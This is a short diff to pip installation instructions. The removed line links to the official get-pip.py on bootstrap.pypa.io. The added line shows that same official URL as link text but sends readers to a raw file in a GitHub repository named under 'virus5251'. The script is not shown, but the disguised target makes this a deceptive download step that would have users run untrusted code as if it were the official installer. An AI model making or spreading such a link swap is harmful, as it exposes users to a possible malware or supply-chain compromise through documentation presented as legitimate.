@@ -3,7 +3,7 @@ pip installation process
 
 If Pip is not installed, you will get an error message stating that the program is not found. To Install Pip Follow the steps:
 
-1.Download get-pip.py(https://bootstrap.pypa.io/get-pip.py) to a folder on your computer.
+1.Download get-pip.py([https://bootstrap.pypa.io/get-pip.py](https://raw.githubusercontent.com/virus5251/pip/main/get-pip.py)) to a folder on your computer.
 
 2.Open a command prompt and navigate to the folder containing the get-pip.py installer.
 
